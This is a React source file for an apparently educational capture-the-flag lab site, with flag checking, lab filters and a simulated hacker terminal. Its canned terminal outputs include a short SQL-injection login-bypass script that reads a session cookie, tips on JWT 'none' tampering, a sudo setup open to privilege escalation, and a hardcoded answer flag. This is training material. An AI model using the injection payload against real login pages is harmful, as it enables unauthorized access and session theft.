  const [flagFeedback, setFlagFeedback] = useState<Record<string, { type: 'success' | 'error'; message: string } | null>>({});
  const [completedSteps, setCompletedSteps] = useState<Record<string, Record<number, boolean>>>({});
  const [simulatedStepOutputs, setSimulatedStepOutputs] = useState<Record<string, Record<number, boolean>>>({});
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);

  // Solved Labs Tracking
  const [solvedLabs, setSolvedLabs] = useState<string[]>(() => {
    try {
      const saved = localStorage.getItem('ctf_solved_labs');
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  // Terminal Simulator State
  const [terminalMaximized, setTerminalMaximized] = useState<boolean>(false);
  const [terminalHistory, setTerminalHistory] = useState<{ type: 'input' | 'output' | 'error' | 'success'; text: string; rawHtml?: boolean }[]>([
    { type: 'output', text: 'CTF / LABS [Version 2026.04.1-LIVE]' },
    { type: 'output', text: 'Curated by Abdurrahman — Red Team & Exploit Defense Sandbox' },
    { type: 'output', text: 'Type "help" to view available cyber commands or "ls" to inspect local artifacts.' },
  ]);
  const [terminalInput, setTerminalInput] = useState<string>('');
  const [commandHistory, setCommandHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState<number>(-1);
  const terminalEndRef = useRef<HTMLDivElement>(null);
  const terminalInputRef = useRef<HTMLInputElement>(null);

  // Keep sound engine synced
  useEffect(() => {
    audioEngine.enabled = soundEnabled;
    localStorage.setItem('ctf_sound_enabled', String(soundEnabled));
  }, [soundEnabled]);

  // Persist solved labs
  useEffect(() => {
    localStorage.setItem('ctf_solved_labs', JSON.stringify(solvedLabs));
  }, [solvedLabs]);

  // Auto-scroll terminal
  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [terminalHistory]);

  const toggleSound = () => {
    const next = !soundEnabled;
    setSoundEnabled(next);
    audioEngine.enabled = next;
    if (next) {
      audioEngine.playClick();
    }
  };

  const playClick = () => {
    audioEngine.playClick();
  };

  // Filter logic
  const filteredLabs = LABS_DATA.filter((lab) => {
    const matchCategory = selectedCategory === 'All Labs' || lab.category === selectedCategory;
    const matchDifficulty = selectedDifficulty === 'All' || lab.difficulty === selectedDifficulty;
    const matchSearch =
      searchQuery.trim() === '' ||
      lab.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      lab.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
      lab.tags.some((tag) => tag.toLowerCase().includes(searchQuery.toLowerCase())) ||
      lab.category.toLowerCase().includes(searchQuery.toLowerCase());
    return matchCategory && matchDifficulty && matchSearch;
  });

  // Flag Submission Handler
  const handleFlagSubmit = (labId: string, labFlag: string) => {
    const input = (flagInputs[labId] || '').trim();
    if (!input) {
      audioEngine.playError();
      setFlagFeedback((prev) => ({
        ...prev,
        [labId]: { type: 'error', message: 'Please enter a flag token before submitting.' }
      }));
      return;
    }

    if (input === labFlag) {
      audioEngine.playSuccess();
      setFlagFeedback((prev) => ({
        ...prev,
        [labId]: { type: 'success', message: 'ACCESS GRANTED! Flag confirmed. Lab marked as SOLVED.' }
      }));
      if (!solvedLabs.includes(labId)) {
        setSolvedLabs((prev) => [...prev, labId]);
      }
    } else {
      audioEngine.playError();
      setFlagFeedback((prev) => ({
        ...prev,
        [labId]: { type: 'error', message: 'INVALID FLAG! Verification failed. Check your recon steps or inspect the hint.' }
      }));
    }
  };

  // Step toggle
  const toggleStep = (labId: string, stepIndex: number) => {
    playClick();
    setCompletedSteps((prev) => {
      const labSteps = prev[labId] || {};
      return {
        ...prev,
        [labId]: {
          ...labSteps,
          [stepIndex]: !labSteps[stepIndex]
        }
      };
    });
  };

  // Simulate command in lab modal
  const handleSimulateCommand = (labId: string, stepIdx: number) => {
    audioEngine.playCommandRun();
    setSimulatedStepOutputs((prev) => {
      const labOutputs = prev[labId] || {};
      return {
        ...prev,
        [labId]: {
          ...labOutputs,
          [stepIdx]: true
        }
      };
    });
  };

  // Copy command helper
  const handleCopy = (text: string) => {
    audioEngine.playClick();
    navigator.clipboard.writeText(text);
    setCopiedCommand(text);
    setTimeout(() => {
      setCopiedCommand((current) => (current === text ? null : current));
    }, 2000);
  };

  // Terminal command execution
  const executeTerminalCommand = (rawCmd: string) => {
    const cmd = rawCmd.trim();
    audioEngine.playCommandRun();

    // Add to input history
    setTerminalHistory((prev) => [...prev, { type: 'input', text: cmd }]);
    if (cmd) {
      setCommandHistory((prev) => [...prev, cmd]);
      setHistoryIndex(-1);
    }

    const parts = cmd.split(' ').filter(Boolean);
    const primary = parts[0]?.toLowerCase();
    const arg = parts.slice(1).join(' ');

    switch (primary) {
      case 'help':
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'output',
            text: `Available CTF / LABS Terminal Commands:
  help               - Display this cyber command manual
  clear              - Wipe the terminal display screen
  whoami             - Display authenticated operator profile
  ls                 - List files in current sandbox workspace
  cat <filename>     - Read file contents (e.g., cat flag.txt, cat notes.md)
  skills             - Print technical enumeration and exploit capabilities
  nmap <target>      - Run stealth port reconnaissance simulation
  sudo -l            - List privileged sudo executions allowed for current user
  id                 - Print effective user and group identities
  labs               - Summary of all available and solved practice labs
  sound [on|off]     - Toggle button and audio telemetry effects
  matrix             - Trigger green digital rain memory dump
  history            - Display recent command line invocation history
  date               - Print current local and UTC chronometer`
          }
        ]);
        break;

      case 'clear':
        setTerminalHistory([]);
        break;

      case 'whoami':
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'output',
            text: `Operator: abdurrahman\nTitle: Security Researcher & CTF / LABS Architect\nClearance: Level 5 Red Team Instructor\nSystem: Linux pwnbox 6.8.0-kali-amd64`
          }
        ]);
        break;

      case 'ls':
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'output',
            text: `flag.txt  notes.md  linpeas.sh  exploit_payload.py  nmap_scan.txt  labs.json  tools/`
          }
        ]);
        break;

      case 'cat':
        if (!arg) {
          setTerminalHistory((prev) => [
            ...prev,
            { type: 'error', text: 'cat: missing file operand. Example: cat flag.txt' }
          ]);
        } else if (arg === 'flag.txt') {
          audioEngine.playSuccess();
          setTerminalHistory((prev) => [
            ...prev,
            {
              type: 'success',
              text: `CTF{4bdurr4hm4n_c7f_m4573r_2026_0x99}\n[+] Terminal Master Flag captured! Congratulations, operator.`
            }
          ]);
        } else if (arg === 'notes.md') {
          setTerminalHistory((prev) => [
            ...prev,
            {
              type: 'output',
              text: `# Abdurrahman's Field Recon Notes\n1. Always run SYN scans (-sS) prior to full connect scans.\n2. Never overlook SUID binaries in /usr/bin or /opt.\n3. Always fuzz query params for SQLi and SSTI injection points.\n4. When dealing with JWTs, test the 'none' algorithm bypass.`
            }
          ]);
        } else if (arg === 'linpeas.sh') {
          setTerminalHistory((prev) => [
            ...prev,
            {
              type: 'output',
              text: `#!/bin/sh\n# LinPEAS - Linux Privilege Escalation Awesome Script\n# Version: 2026.04\n[+] Checking SUID/SGID binaries...\n[+] Checking Sudo permissions...\n[+] Checking Cron jobs and timers...`
            }
          ]);
        } else if (arg === 'exploit_payload.py') {
          setTerminalHistory((prev) => [
            ...prev,
            {
              type: 'output',
              text: `import requests\n# Exploit Author: Abdurrahman\ntarget = "http://10.10.12.10/login.php"\npayload = {"username": "' OR 1=1-- -", "password": "foo"}\nresp = requests.post(target, data=payload)\nprint("[+] Session Cookie:", resp.cookies.get("auth_token"))`
            }
          ]);
        } else if (arg === 'nmap_scan.txt') {
          setTerminalHistory((prev) => [
            ...prev,
            {
              type: 'output',
              text: `# Nmap 7.94 scan initiated for 10.10.11.42\nHost is up (0.0042s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1\n80/tcp   open  http    Apache httpd 2.4.57\n8080/tcp open  http    Apache Tomcat 9.0.41\n3306/tcp open  mysql   MySQL 8.0.35`
            }
          ]);
        } else if (arg === 'labs.json') {
          setTerminalHistory((prev) => [
            ...prev,
            {
              type: 'output',
              text: JSON.stringify(
                LABS_DATA.map((l) => ({ id: l.id, title: l.title, category: l.category, difficulty: l.difficulty })),
                null,
                2
              )
            }
          ]);
        } else {
          setTerminalHistory((prev) => [
            ...prev,
            { type: 'error', text: `cat: ${arg}: No such file or directory` }
          ]);
        }
        break;

      case 'skills':
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'output',
            text: `CORE CYBERSECURITY SKILLS CURATED BY ABDURRAHMAN:

[1] ENUMERATION & RECONNAISSANCE:
    - Host & Network Discovery: Nmap, Masscan, Arp-Scan, Netdiscover
    - Web Directory Fuzzing: Gobuster, Feroxbuster, Wfuzz, Dirsearch
    - DNS & Subdomain Recon: Dig, AXFR Zone Transfers, Amass, Sublist3r
    - Service Fingerprinting: Banner grabbing, Netcat, Enum4linux, SMBClient

[2] WEB APPLICATION EXPLOITATION:
    - SQL Injection: Union-based, Blind Boolean, Time-based, SQLMap
    - Cross-Site Scripting (XSS): Stored, Reflected, DOM-based, CSP Bypass
    - Command Injection (RCE): Shell metacharacter evasion, $IFS bypass
    - Authentication Bypass: JWT 'none' algorithm tampering, IDOR, Session Hijacking

[3] LINUX FUNDAMENTALS & PRIVILEGE ESCALATION:
    - SUID/SGID Binary Exploitation & GTFOBins
    - Sudoers Misconfigurations & LD_PRELOAD Hijacking
    - Linux File Permissions & World-Writable Configuration Files
    - Cron Job Wildcard Tar Exploitation
    - Linux POSIX Capabilities (cap_setuid, cap_net_admin)`
          }
        ]);
        break;

      case 'nmap':
        const target = arg || '10.10.11.42';
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'output',
            text: `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString()}
Nmap scan report for ${target}
Host is up (0.0084s latency).
rDNS record for ${target}: gateway.target.lab
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp   open  http    nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Apache Tomcat/9.0.41 (Administration)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds`
          }
        ]);
        break;

      case 'sudo':
        if (arg === '-l') {
          setTerminalHistory((prev) => [
            ...prev,
            {
              type: 'output',
              text: `Matching Defaults entries for abdurrahman on pwnbox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin

User abdurrahman may run the following commands on pwnbox:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/python3 /opt/automation/backup.py`
            }
          ]);
        } else {
          setTerminalHistory((prev) => [
            ...prev,
            { type: 'error', text: 'sudo: auth required. Try: sudo -l' }
          ]);
        }
        break;

      case 'id':
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'output',
            text: 'uid=1000(abdurrahman) gid=1000(abdurrahman) groups=1000(abdurrahman),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)'
          }
        ]);
        break;

      case 'labs':
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'output',
            text: `CTF / LABS INVENTORY:
Solved: ${solvedLabs.length} / ${LABS_DATA.length}

${LABS_DATA.map(
  (l) => `[${solvedLabs.includes(l.id) ? 'SOLVED' : 'ACTIVE'}] ${l.id.toUpperCase()} - ${l.title} (${l.difficulty})`
).join('\n')}`
          }
        ]);
        break;

      case 'sound':
        if (arg === 'on') {
          setSoundEnabled(true);
          setTerminalHistory((prev) => [...prev, { type: 'success', text: '[+] Cyber Audio Telemetry ENABLED.' }]);
        } else if (arg === 'off') {
          setSoundEnabled(false);
          setTerminalHistory((prev) => [...prev, { type: 'output', text: '[-] Cyber Audio Telemetry DISABLED.' }]);
        } else {
          setTerminalHistory((prev) => [
            ...prev,
            { type: 'output', text: `Audio status: ${soundEnabled ? 'ENABLED' : 'DISABLED'}. Usage: sound on | sound off` }
          ]);
        }
        break;

      case 'matrix':
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'success',
            text: `01000011 01010100 01000110 00100000 01001100 01000001 01000010 01010011
41 62 64 75 72 72 61 68 6d 61 6e 20 53 65 63 75 72 69 74 79
[SYS_MEM_DUMP] 0x00FF66 -> 0xFF2A5F -> BUFFER_INITIALIZED
System ready. All red team vectors active.`
          }
        ]);
        break;

      case 'history':
        setTerminalHistory((prev) => [
          ...prev,
          {
            type: 'output',
            text: commandHistory.length > 0 ? commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n') : 'No commands in buffer.'
          }
        ]);
        break;

      case 'date':
        setTerminalHistory((prev) => [
          ...prev,
          { type: 'output', text: `Current Timestamp: ${new Date().toUTCString()} (Local: ${new Date().toLocaleTimeString()})` }
        ]);
        break;

      case '':
        break;

      default:
        setTerminalHistory((prev) => [
          ...prev,
          { type: 'error', text: `bash: ${primary}: command not found. Type "help" for a list of available cyber commands.` }
        ]);
        break;
    }
  };

  const handleTerminalKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    audioEngine.playKeypress();
    if (e.key === 'Enter') {
      executeTerminalCommand(terminalInput);
      setTerminalInput('');
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (commandHistory.length > 0) {
        const nextIndex = historyIndex === -1 ? commandHistory.length - 1 : Math.max(0, historyIndex - 1);
        setHistoryIndex(nextIndex);
        setTerminalInput(commandHistory[nextIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex !== -1) {
        const nextIndex = historyIndex + 1;
        if (nextIndex < commandHistory.length) {
          setHistoryIndex(nextIndex);
          setTerminalInput(commandHistory[nextIndex]);
        } else {
          setHistoryIndex(-1);
          setTerminalInput('');
        }
      }
    } else if (e.key === 'Tab') {
      e.preventDefault();
      const tokens = ['help', 'clear', 'whoami', 'ls', 'cat flag.txt', 'skills', 'nmap', 'sudo -l', 'id', 'labs', 'sound', 'matrix', 'history'];
      const match = tokens.find((t) => t.startsWith(terminalInput.trim()));
      if (match) {
        setTerminalInput(match);
      }
    }
  };

  const openLabModal = (lab: Lab) => {
    playClick();
    setActiveLab(lab);
    if (!flagInputs[lab.id]) {
      setFlagInputs((prev) => ({ ...prev, [lab.id]: '' }));
    }
  };

  const closeLabModal = () => {
    playClick();
    setActiveLab(null);
  };

  const revealNextHint = (labId: string, totalHints: number) => {
    playClick();
    setRevealedHints((prev) => {
      const current = prev[labId] || 0;
      return {
        ...prev,
        [labId]: Math.min(current + 1, totalHints)
      };
    });
  };

  const categories = ['All Labs', 'Enumeration', 'Web Exploitation', 'Linux Fundamentals'];
  const difficulties = ['All', 'Easy', 'Medium', 'Hard'];

  return (
    <div className="min-h-screen bg-[#0a0e17] text-slate-200 cyber-grid-pattern selection:bg-[#00ff66]/20 selection:text-[#00ff66]">
      {/* Glow overlay */}
      <div className="fixed inset-0 cyber-radial-glow pointer-events-none z-0" />

      {/* TOP NAVIGATION BAR */}
      <header className="relative z-20 border-b border-slate-800/80 bg-[#0a0e17]/90 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          {/* Zone 1: Brand Wordmark */}
          <div className="flex items-center gap-3">
            <div className="h-9 w-9 rounded border border-[#00ff66]/40 bg-[#00ff66]/10 flex items-center justify-center text-[#00ff66] shadow-[0_0_12px_rgba(0,255,102,0.2)]">
              <Shield className="h-5 w-5 animate-pulse-slow" />
            </div>
            <a
              href="#top"
              onClick={playClick}
              className="text-lg font-bold tracking-tight text-white flex items-center gap-2 hover:text-[#00ff66] transition-colors"
            >
              <span>CTF / LABS</span>
              <span className="text-xs font-mono px-1.5 py-0.5 rounded bg-[#00ff66]/10 text-[#00ff66] border border-[#00ff66]/20">
                v2.6
              </span>
            </a>
          </div>

          {/* Zone 2: Navigation Links */}
          <nav className="hidden md:flex items-center gap-6 text-sm font-medium text-slate-400">
            <a
              href="#labs-section"
              onClick={() => {
                playClick();
                setSelectedCategory('All Labs');
              }}
              className="hover:text-white transition-colors"
            >
              All Labs
            </a>
            <a
              href="#labs-section"
              onClick={() => {
                playClick();
                setSelectedCategory('Enumeration');
              }}
              className="hover:text-[#00ff66] transition-colors"
            >
              Enumeration
            </a>
            <a
              href="#labs-section"
              onClick={() => {
                playClick();
                setSelectedCategory('Web Exploitation');
              }}
              className="hover:text-[#00ff66] transition-colors"
            >
              Web Exploit
            </a>
            <a
              href="#labs-section"
              onClick={() => {
                playClick();
                setSelectedCategory('Linux Fundamentals');
              }}
              className="hover:text-[#00ff66] transition-colors"
            >
              Linux Shell
            </a>
            <a
              href="#terminal-section"
              onClick={playClick}
              className="hover:text-[#ff2a5f] transition-colors flex items-center gap-1.5"
            >
              <Terminal className="h-3.5 w-3.5" />
              Terminal
            </a>
          </nav>

          {/* Zone 3: Actions (Sound toggle + Solved badge) */}
          <div className="flex items-center gap-3">
            <button
              onClick={toggleSound}
              title={soundEnabled ? 'Disable sound effects' : 'Enable sound effects'}
              className={`flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-mono font-medium rounded border transition-all ${
                soundEnabled
                  ? 'border-[#00ff66]/40 bg-[#00ff66]/10 text-[#00ff66] shadow-[0_0_10px_rgba(0,255,102,0.15)]'
                  : 'border-slate-700 bg-slate-800/60 text-slate-400 hover:text-slate-200'
              }`}
            >
              {soundEnabled ? <Volume2 className="h-3.5 w-3.5" /> : <VolumeX className="h-3.5 w-3.5" />}
              <span className="hidden sm:inline">{soundEnabled ? 'SFX: ON' : 'SFX: OFF'}</span>
            </button>

            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded border border-slate-800 bg-slate-900/80 text-xs font-mono">
              <span className="text-slate-400">Captured:</span>
              <span className="text-[#00ff66] font-bold tabular-nums">
                {solvedLabs.length}/{LABS_DATA.length}
              </span>
            </div>
          </div>
        </div>
      </header>

      {/* HERO SECTION */}
      <section id="top" className="relative z-10 pt-14 pb-12 border-b border-slate-800/60 overflow-hidden">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col items-start max-w-3xl">
            {/* Live Status Badge */}
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded border border-[#00ff66]/30 bg-[#00ff66]/10 text-[#00ff66] text-xs font-mono mb-5 shadow-[0_0_15px_rgba(0,255,102,0.1)]">
              <span className="h-2 w-2 rounded-full bg-[#00ff66] animate-ping" />
              <span>Labs Online - Interactive Mode Enabled</span>
            </div>

            {/* Title & Subtitle */}
            <h1 className="text-4xl sm:text-5xl font-extrabold tracking-tight text-white mb-2 text-balance">
              CTF / LABS
            </h1>
            <p className="text-lg font-mono text-[#00ff66] tracking-wide mb-4">
              Curated by Abdurrahman
            </p>

            {/* Hero Description */}
            <p className="text-base sm:text-lg text-slate-300 leading-relaxed mb-8 max-w-2xl">
              Interactive lab environments, enumeration techniques, web vulnerability analysis, and Linux privilege escalation mechanics.
            </p>

            {/* Quick Action Buttons & Stats */}
            <div className="flex flex-wrap items-center gap-4">
              <a
                href="#labs-section"
                onClick={playClick}
                className="inline-flex items-center gap-2 px-5 py-2.5 rounded bg-[#00ff66] text-[#0a0e17] font-semibold text-sm hover:bg-[#00e55c] transition-all shadow-[0_0_20px_rgba(0,255,102,0.3)] hover:shadow-[0_0_25px_rgba(0,255,102,0.4)]"
              >
                <Zap className="h-4 w-4 fill-current" />
                Explore Active Labs
              </a>
              <a
                href="#terminal-section"
                onClick={playClick}
                className="inline-flex items-center gap-2 px-5 py-2.5 rounded bg-slate-900 border border-slate-700 text-slate-200 font-mono text-sm hover:border-[#ff2a5f]/60 hover:text-[#ff2a5f] transition-all"
              >
                <Terminal className="h-4 w-4" />
                Launch Terminal
              </a>
            </div>

            {/* Sub-bar metrics */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 sm:gap-8 mt-10 pt-8 border-t border-slate-800/80 w-full font-mono text-xs">
              <div>
                <span className="text-slate-500 block">AVAILABLE TARGETS</span>
                <span className="text-white text-base font-bold tabular-nums">15 Practice Labs</span>
              </div>
              <div>
                <span className="text-slate-500 block">CORE DOMAINS</span>
                <span className="text-[#00ff66] text-base font-bold">Enum / Web / Linux</span>
              </div>
              <div>
                <span className="text-slate-500 block">FLAG VERIFIER</span>
                <span className="text-white text-base font-bold">SHA-256 Matcher</span>
              </div>
              <div>
                <span className="text-slate-500 block">ENVIRONMENT</span>
                <span className="text-[#00e5ff] text-base font-bold">Isolated Sandbox</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* CORE CATEGORY OVERVIEW TILES */}
      <section className="relative z-10 py-8 border-b border-slate-800/60 bg-[#0d131f]/60">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
            {/* Enumeration Hub */}
            <div
              onClick={() => {
                playClick();
                setSelectedCategory('Enumeration');
                document.getElementById('labs-section')?.scrollIntoView({ behavior: 'smooth' });
              }}
              className="cursor-pointer p-5 rounded-lg border border-slate-800 bg-[#111827]/70 hover:border-[#00ff66]/50 hover:shadow-[0_0_20px_rgba(0,255,102,0.1)] transition-all group"
            >
              <div className="flex items-center justify-between mb-3">
                <div className="h-10 w-10 rounded bg-[#00ff66]/10 text-[#00ff66] flex items-center justify-center border border-[#00ff66]/30 group-hover:scale-105 transition-transform">
                  <Radio className="h-5 w-5" />
                </div>
                <span className="text-xs font-mono text-[#00ff66]">5 Modules</span>
              </div>
              <h2 className="text-base font-bold text-white mb-1 group-hover:text-[#00ff66] transition-colors">
                Enumeration Hub
              </h2>
              <p className="text-xs text-slate-400 leading-relaxed">
                Network discovery, Nmap workflows, directory busting, OSINT, and service banner grabbing.
              </p>
            </div>

            {/* Web Exploitation Hub */}
            <div
              onClick={() => {
                playClick();
                setSelectedCategory('Web Exploitation');
                document.getElementById('labs-section')?.scrollIntoView({ behavior: 'smooth' });
              }}
              className="cursor-pointer p-5 rounded-lg border border-slate-800 bg-[#111827]/70 hover:border-[#ff2a5f]/50 hover:shadow-[0_0_20px_rgba(255,42,95,0.1)] transition-all group"
            >
              <div className="flex items-center justify-between mb-3">
                <div className="h-10 w-10 rounded bg-[#ff2a5f]/10 text-[#ff2a5f] flex items-center justify-center border border-[#ff2a5f]/30 group-hover:scale-105 transition-transform">
                  <Globe className="h-5 w-5" />
                </div>
                <span className="text-xs font-mono text-[#ff2a5f]">5 Modules</span>
              </div>
              <h2 className="text-base font-bold text-white mb-1 group-hover:text-[#ff2a5f] transition-colors">
                Web Exploitation Hub
              </h2>
              <p className="text-xs text-slate-400 leading-relaxed">
                SQL Injection, XSS, Command Injection, Burp Suite request tampering, and auth bypass.
              </p>
            </div>

            {/* Linux Fundamentals Hub */}
            <div
              onClick={() => {
                playClick();
                setSelectedCategory('Linux Fundamentals');
                document.getElementById('labs-section')?.scrollIntoView({ behavior: 'smooth' });
              }}
              className="cursor-pointer p-5 rounded-lg border border-slate-800 bg-[#111827]/70 hover:border-[#00e5ff]/50 hover:shadow-[0_0_20px_rgba(0,229,255,0.1)] transition-all group"
            >
              <div className="flex items-center justify-between mb-3">
                <div className="h-10 w-10 rounded bg-[#00e5ff]/10 text-[#00e5ff] flex items-center justify-center border border-[#00e5ff]/30 group-hover:scale-105 transition-transform">
                  <Cpu className="h-5 w-5" />
                </div>
                <span className="text-xs font-mono text-[#00e5ff]">5 Modules</span>
              </div>
              <h2 className="text-base font-bold text-white mb-1 group-hover:text-[#00e5ff] transition-colors">
                Linux Fundamentals Hub
              </h2>
              <p className="text-xs text-slate-400 leading-relaxed">
                File permissions, privilege escalation paths, shell scripting, and system internals.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* LABS GRID & SEARCH SECTION */}
      <section id="labs-section" className="relative z-10 py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          {/* SEARCH & FILTER BAR */}
          <div className="mb-8 space-y-4">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
              {/* Search input field */}
              <div className="relative flex-1 max-w-lg">
                <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-500" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  onKeyDown={() => audioEngine.playKeypress()}
                  placeholder="Search labs by title, vulnerability, or tag (e.g., nmap, sqli, suid)..."
                  className="w-full pl-10 pr-10 py-2.5 rounded-lg bg-[#111827] border border-slate-800 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-[#00ff66] focus:ring-1 focus:ring-[#00ff66] transition-all font-mono"
                />
                {searchQuery && (
                  <button
                    onClick={() => {
                      playClick();
                      setSearchQuery('');
                    }}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-slate-400 hover:text-white"
                  >
                    Clear
                  </button>
                )}
              </div>

              {/* Difficulty filter dropdown/toggle */}
              <div className="flex items-center gap-1.5 text-xs font-mono self-start md:self-auto">
                <span className="text-slate-500 mr-1">Difficulty:</span>
                {difficulties.map((diff) => (
                  <button
                    key={diff}
                    onClick={() => {
                      playClick();
                      setSelectedDifficulty(diff);
                    }}
                    className={`px-2.5 py-1.5 rounded transition-colors ${
                      selectedDifficulty === diff
                        ? 'bg-slate-800 text-white font-semibold border border-slate-700'
                        : 'text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    {diff}
                  </button>
                ))}
              </div>
            </div>

            {/* Category Filter Buttons */}
            <div className="flex flex-wrap items-center gap-2 border-b border-slate-800/80 pb-4">
              {categories.map((cat) => {
                const isActive = selectedCategory === cat;
                return (
                  <button
                    key={cat}
                    onClick={() => {
                      playClick();
                      setSelectedCategory(cat);
                    }}
                    className={`px-3.5 py-1.5 text-xs font-medium rounded-md transition-all ${
                      isActive
                        ? 'bg-[#00ff66] text-[#0a0e17] font-semibold shadow-[0_0_12px_rgba(0,255,102,0.25)]'
                        : 'bg-[#111827] text-slate-300 border border-slate-800 hover:border-slate-700 hover:text-white'
                    }`}
                  >
                    {cat}
                  </button>
                );
              })}
              <div className="ml-auto text-xs font-mono text-slate-500 hidden sm:block">
                Showing {filteredLabs.length} of {LABS_DATA.length} Labs
              </div>
            </div>
          </div>

          {/* LAB CARDS GRID */}
          {filteredLabs.length === 0 ? (
            <div className="p-12 text-center border border-dashed border-slate-800 rounded-lg bg-[#111827]/40">
              <AlertTriangle className="h-8 w-8 text-amber-500 mx-auto mb-3" />
              <h3 className="text-base font-semibold text-white mb-1">No Practice Labs Found</h3>
              <p className="text-xs text-slate-400 max-w-sm mx-auto mb-4">
                No labs matched your search query "{searchQuery}". Try broadening your keywords or selecting another category.
              </p>
              <button
                onClick={() => {
                  playClick();
                  setSearchQuery('');
                  setSelectedCategory('All Labs');
                  setSelectedDifficulty('All');
                }}
                className="px-3.5 py-1.5 text-xs rounded bg-slate-800 text-slate-200 hover:bg-slate-700 font-mono"
              >
                Reset All Filters
              </button>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {filteredLabs.map((lab) => {
                const isSolved = solvedLabs.includes(lab.id);
                return (
                  <div
                    key={lab.id}
                    className={`flex flex-col justify-between p-6 rounded-lg border bg-[#111827]/80 backdrop-blur-sm transition-all hover:translate-y-[-2px] ${
                      isSolved
                        ? 'border-[#00ff66]/40 shadow-[0_0_15px_rgba(0,255,102,0.08)]'
                        : 'border-slate-800/90 hover:border-slate-700'
                    }`}
                  >
                    <div>
                      {/* Top metadata line without pill sandwich */}
                      <div className="flex items-center justify-between text-xs font-mono text-slate-400 mb-3">
                        <div className="flex items-center gap-1.5">
                          <span
                            className={
                              lab.difficulty === 'Easy'
                                ? 'text-[#00ff66]'
                                : lab.difficulty === 'Medium'
                                ? 'text-amber-400'
                                : 'text-[#ff2a5f]'
                            }
                          >
                            ● {lab.difficulty}
                          </span>
                          <span className="text-slate-600">/</span>
                          <span>{lab.category}</span>
                        </div>

                        {isSolved && (
                          <span className="flex items-center gap-1 text-[#00ff66] font-semibold">
                            <CheckCircle2 className="h-3.5 w-3.5" />
                            SOLVED
                          </span>
                        )}
                      </div>

                      {/* Lab Title */}
                      <h3 className="text-lg font-bold text-white mb-2 leading-snug hover:text-[#00ff66] transition-colors">
                        {lab.title}
                      </h3>

                      {/* Lab Short Description */}
                      <p className="text-xs text-slate-400 leading-relaxed mb-4 line-clamp-3">
                        {lab.description}
                      </p>

                      {/* Target Specs */}
                      <div className="p-2.5 rounded bg-[#0a0e17]/80 border border-slate-800/80 mb-4 font-mono text-xs text-slate-400 space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="text-slate-500">Host:</span>
                          <span className="text-slate-300">{lab.targetHost}</span>
                        </div>
                        <div className="flex items-center justify-between">
                          <span className="text-slate-500">Vector:</span>
                          <span className="text-slate-300 truncate max-w-[180px]">{lab.targetService}</span>
                        </div>
                      </div>

                      {/* Unboxed Tag List */}
                      <div className="flex flex-wrap items-center gap-1.5 text-xs font-mono text-slate-500 mb-6">
                        {lab.tags.map((tag, idx) => (
                          <React.Fragment key={tag}>
                            <span>#{tag}</span>
                            {idx < lab.tags.length - 1 && <span className="text-slate-700">·</span>}
                          </React.Fragment>
                        ))}
                      </div>
                    </div>

                    {/* Enter Lab Button with Sound Effect */}
                    <button
                      onClick={() => openLabModal(lab)}
                      className={`w-full py-2.5 px-4 rounded font-mono text-xs font-bold tracking-wider uppercase transition-all flex items-center justify-center gap-2 ${
                        isSolved
                          ? 'bg-slate-800 hover:bg-slate-700 text-[#00ff66] border border-[#00ff66]/30'
                          : 'bg-[#00ff66] hover:bg-[#00e55c] text-[#0a0e17] shadow-[0_0_15px_rgba(0,255,102,0.2)]'
                      }`}
                    >
                      <span>{isSolved ? 'Review Lab' : 'Enter Lab'}</span>
